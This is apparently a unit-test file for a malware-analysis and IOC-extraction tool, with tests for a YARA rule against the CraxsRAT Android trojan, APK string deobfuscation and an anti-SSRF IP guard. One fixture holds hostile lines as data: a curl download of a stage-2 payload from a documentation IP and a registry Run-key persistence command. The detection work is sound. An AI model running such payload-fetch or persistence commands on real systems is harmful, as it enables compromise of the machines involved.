import os
import unittest
from modules.ioc_extractor import is_valid_base58check, extract_advanced_iocs
from modules.deobfuscator import (
    recursive_decode_base64,
    deobfuscate_powershell,
    decrypt_java_byte_array_xor,
    extract_apk_byte_array_xor_strings,
    patch_apk_byte_array_xor_code,
    escape_java_string,
)
from modules.safe_downloader import is_safe_ip
from modules.family_extractor import attribute_malware_family
from core.analyzer import SafeVectorAnalyzer

class TestDetectionEngine(unittest.TestCase):
    def test_base58check_crypto_validation(self):
        # Known valid Bitcoin mainnet address
        valid_btc = b"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
        self.assertTrue(is_valid_base58check(valid_btc))

        # Invalid checksum corrupted address
        invalid_btc = b"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb"
        self.assertFalse(is_valid_base58check(invalid_btc))

    def test_advanced_ioc_extraction(self):
        # Synthetic mock payload using standard RFC 5737 documentation IP (TEST-NET-2: 198.51.100.0/24)
        # and public historical Satoshi Genesis BTC address (1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa)
        sample_payload = (
            b"curl http://198.51.100.24:8080/stage2.bin -o payload.exe\r\n"
            b"Send funds to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa or 0x71C7656EC7ab88b098defB751B7401B5f6d8976F\r\n"
            b"Hidden service: examp234567abcde.onion\r\n"
            b"Webhook: discord.com/api/webhooks/123456789/abcdefgh-token\r\n"
            b"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d payload.exe\r\n"
        )
        iocs = extract_advanced_iocs(sample_payload)

        self.assertIn("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", iocs["wallets"].get("BTC", []))
        self.assertIn("0x71C7656EC7ab88b098defB751B7401B5f6d8976F", iocs["wallets"].get("Ethereum (ETH)", []))
        self.assertIn("examp234567abcde.onion", iocs["network"]["onions"])
        self.assertTrue(any("198.51.100.24:8080" in ep for ep in iocs["network"]["ip_ports"]))
        self.assertTrue(len(iocs["host"]["persistence"]) > 0)

    def test_powershell_deobfuscation(self):
        obfuscated_ps = b"I`n`v`o`k`e`-`E`x`p`r`e`s`s`i`o`n"
        deobfuscated = deobfuscate_powershell(obfuscated_ps)
        self.assertEqual(deobfuscated, b"Invoke-Expression")

    def test_ssrf_ip_guard(self):
        # RFC 1918 Private / Loopback / Link-Local IP addresses (Standard anti-SSRF security test)
        self.assertFalse(is_safe_ip("127.0.0.1"))        # Standard Loopback
        self.assertFalse(is_safe_ip("10.0.0.1"))          # RFC 1918 Private Class A
        self.assertFalse(is_safe_ip("192.168.1.1"))        # RFC 1918 Private Class C
        self.assertFalse(is_safe_ip("169.254.169.254"))    # Cloud Instance Metadata IP (AWS/Azure/GCP)

        # Well-known public Anycast DNS resolvers (Google DNS / Cloudflare DNS)
        self.assertTrue(is_safe_ip("8.8.8.8"))             # Google Public DNS
        self.assertTrue(is_safe_ip("1.1.1.1"))             # Cloudflare Public DNS

    def test_android_manifest_analysis(self):
        import tempfile
        from pathlib import Path

        sample_xml = """<?xml version="1.0" encoding="utf-8"?>
        <manifest xmlns:android="http://schemas.android.com/apk/res/android"
            package="com.evil.banker.dropper">
            <uses-permission android:name="android.permission.INTERNET" />
            <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
            <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
            <uses-permission android:name="android.permission.READ_SMS" />
        </manifest>"""
        with tempfile.TemporaryDirectory() as tmpdir:
            manifest_file = Path(tmpdir) / "AndroidManifest.xml"
            manifest_file.write_text(sample_xml, encoding="utf-8")

            analyzer = SafeVectorAnalyzer("dummy.apk", interactive=False)
            analyzer.analyze_android_manifest(manifest_file)

            manifest_info = analyzer.results["deep_analysis"]["android_manifest"]
            self.assertIsNotNone(manifest_info)
            self.assertEqual(manifest_info["package_name"], "com.evil.banker.dropper")
            self.assertIn("android.permission.BIND_ACCESSIBILITY_SERVICE", manifest_info["declared_permissions"])
            self.assertTrue(len(manifest_info["dangerous_permissions"]) >= 4)
            self.assertTrue(analyzer.results["threat_intel"]["is_suspected_vector"])

    def test_apk_byte_array_xor_decryption(self):
        # 1. Exact user test case
        data_ints = [-9, -84, 102]
        key_ints = [-124, -99, 21]
        decoded = decrypt_java_byte_array_xor(data_ints, key_ints)
        self.assertEqual(decoded, "s1s")

        # 2. Parsing Java source code containing single & multiline invocations
        mock_java_source = """
        package com.example.dropper;
        public class SampleActivity {
            public void run() {
                String payloadName = mb0.a(new byte[]{-9, -84, 102}, new byte[]{-124, -99, 21});
                String c2Server = OtherClass.decrypt(
                    new byte[]{ -12, -95, -78, -80, -96, -23, -29, -29 },
                    new byte[]{ -107, -42, -50 }
                );
            }
        }
        """
        extracted = extract_apk_byte_array_xor_strings(mock_java_source)
        self.assertEqual(len(extracted), 2)
        self.assertEqual(extracted[0]["decoded_value"], "s1s")

    def test_scan_decompiled_sources_integration(self):
        import tempfile
        from pathlib import Path

        mock_java_source = """
        package com.example.dropper;
        public class SampleActivity {
            public static String getPayload() {
                return mb0.a(new byte[]{-9, -84, 102}, new byte[]{-124, -99, 21});
            }
        }
        """
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp_path = Path(tmpdir)
            source_file = tmp_path / "SampleActivity.java"
            source_file.write_text(mock_java_source, encoding="utf-8")

            analyzer = SafeVectorAnalyzer("sample.apk", interactive=False)
            analyzer.jadx_output_dir = tmp_path
            analyzer.deobfuscated_sources_dir = tmp_path / "sample_deobfuscated_sources"
            analyzer.scan_decompiled_sources()

            recovered = analyzer.results["deep_analysis"]["recovered_obfuscated_strings"]
            self.assertTrue(any(r["decoded_value"] == "s1s" for r in recovered))
            self.assertTrue(any(r.get("obfuscation_type") == "apk_repeating_byte_xor" for r in recovered))

    def test_apk_inline_patching_and_directory_hierarchy(self):
        import tempfile
        from pathlib import Path

        # 1. Test Java string literal escaping
        raw_test = 'Line1\nLine2\t"Quoted" \\ Backslash \x00 null'
        escaped = escape_java_string(raw_test)
        self.assertIn('\\"', escaped)
        self.assertIn('\\n', escaped)
        self.assertIn('\\t', escaped)
        self.assertIn('\\\\', escaped)
        self.assertIn('\\u0000', escaped)

        # 2. Test inline code replacement
        mock_java = (
            "package com.sample.target;\n"
            "public class MainActivity {\n"
            "    public static String key = mb0.a(new byte[]{-9, -84, 102}, new byte[]{-124, -99, 21});\n"
            "}\n"
        )
        patched_code, repl_count, items = patch_apk_byte_array_xor_code(mock_java)
        self.assertEqual(repl_count, 1)
        self.assertIn('public static String key = "s1s";', patched_code)
        self.assertNotIn("mb0.a", patched_code)

        # 3. Test full directory hierarchy preservation and manifest copying
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp_root = Path(tmpdir)
            apk_path = tmp_root / "sample_target.apk"
            apk_path.write_bytes(b"PK\x03\x04")

            jadx_dir = tmp_root / "sample_target_jadx_decompiled"
            sources_dir = jadx_dir / "sources" / "com" / "sample" / "target"
            sources_dir.mkdir(parents=True, exist_ok=True)
            (sources_dir / "MainActivity.java").write_text(mock_java, encoding="utf-8")

            res_dir = jadx_dir / "resources"
            res_dir.mkdir(parents=True, exist_ok=True)
            (res_dir / "AndroidManifest.xml").write_text('<manifest package="com.sample.target"/>', encoding="utf-8")

            analyzer = SafeVectorAnalyzer(str(apk_path), interactive=False)
            analyzer.jadx_output_dir = jadx_dir
            analyzer.deobfuscated_sources_dir = tmp_root / "sample_target_deobfuscated_sources"
            analyzer.scan_decompiled_sources()

            target_file = analyzer.deobfuscated_sources_dir / "com" / "sample" / "target" / "MainActivity.java"
            self.assertTrue(target_file.is_file(), f"Expected deobfuscated file at {target_file}")
            deobfuscated_content = target_file.read_text(encoding="utf-8")
            self.assertIn('public static String key = "s1s";', deobfuscated_content)
            self.assertNotIn("mb0.a", deobfuscated_content)

            target_manifest = analyzer.deobfuscated_sources_dir / "AndroidManifest.xml"
            self.assertTrue(target_manifest.is_file(), "Expected AndroidManifest.xml copied to deobfuscated sources")

    def test_craxsrat_blackant_yara_rule(self):
        from pathlib import Path
        rule_path = Path(__file__).parent.parent / "rules" / "Android_CraxsRAT_BlackAnt.yar"
        self.assertTrue(rule_path.is_file(), "Rule file Android_CraxsRAT_BlackAnt.yar should exist")

        try:
            import yara
            compiled_rule = yara.compile(str(rule_path))
        except ImportError:
            self.skipTest("yara-python not installed")

        # 1. Positive Test: APK header (PK\x03\x04) + cleaner + Master Password + Salt
        apk_payload = b"PK\x03\x04" + b"\x00" * 20 + b"fofodkmomqqm" + b"..." + b"4814780584699673" + b"..." + b"2894356330652558"
        matches = compiled_rule.match(data=apk_payload)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule, "Android_CraxsRAT_SpyNote_BlackAnt")

        # 2. Positive Test: DEX header (dex\n035\0) + cleaner (UTF-16LE / wide) + IV + C2 panel dir
        wide_cleaner = "fofodkmomqqm".encode('utf-16le')
        dex_payload = b"dex\n035\x00" + b"\x00" * 10 + wide_cleaner + b"..." + b"2230209" + b"..." + b"/yaarsa/private/"
        matches_dex = compiled_rule.match(data=dex_payload)
        self.assertEqual(len(matches_dex), 1)

        # 3. Negative Test: Missing deobfuscation cleaner (should NOT trigger)
        neg_missing_cleaner = b"PK\x03\x04" + b"4814780584699673" + b"2894356330652558" + b"/yaarsa/private/"
        self.assertEqual(len(compiled_rule.match(data=neg_missing_cleaner)), 0)

        # 4. Negative Test: Cleaner present but only 1 artifact (insufficient corroboration)
        neg_only_one = b"PK\x03\x04" + b"fofodkmomqqm" + b"4814780584699673"
        self.assertEqual(len(compiled_rule.match(data=neg_only_one)), 0)

        # 5. Negative Test: Cleaner + 2 artifacts but Windows PE header instead of DEX/APK (avoids non-Android false positives)
        neg_pe_header = b"MZ\x90\x00" + b"fofodkmomqqm" + b"4814780584699673" + b"2894356330652558"
        self.assertEqual(len(compiled_rule.match(data=neg_pe_header)), 0)

        # 6. Verify CTI family attribution mapping
        family, confidence, config = attribute_malware_family(apk_payload, [{"rule_name": "Android_CraxsRAT_SpyNote_BlackAnt"}])
        self.assertIn("CraxsRAT", family)
        self.assertEqual(confidence, "High (YARA)")
        self.assertEqual(config.get("crypto_scheme"), "PBKDF2/AES")

def benchmark_corpus(goodware_dir, malware_dir):
    """Optional benchmark utility to evaluate TPR and FPR against local test datasets."""
    if not os.path.exists(goodware_dir) or not os.path.exists(malware_dir):
        print(f"[-] Benchmark skipped: Dataset directories '{goodware_dir}' or '{malware_dir}' not found.")
        return

    fp, tp, fn, tn = 0, 0, 0, 0

    for f in os.listdir(goodware_dir):
        fpth = os.path.join(goodware_dir, f)
        if os.path.isfile(fpth):
            analyzer = SafeVectorAnalyzer(fpth, interactive=False)
            analyzer.run_analysis()
            if analyzer.results['threat_intel']['is_suspected_vector']: fp += 1
            else: tn += 1

    for f in os.listdir(malware_dir):
        fpth = os.path.join(malware_dir, f)
        if os.path.isfile(fpth):
            analyzer = SafeVectorAnalyzer(fpth, interactive=False)
            analyzer.run_analysis()
            if analyzer.results['threat_intel']['is_suspected_vector']: tp += 1
            else: fn += 1

    total_g = fp + tn
    total_m = tp + fn
    print(f"FPR (False Positive Rate): {fp/total_g*100:.2f}%" if total_g else "No Goodware tested")
    print(f"TPR (True Positive Rate): {tp/total_m*100:.2f}%" if total_m else "No Malware tested")

if __name__ == "__main__":
    unittest.main()
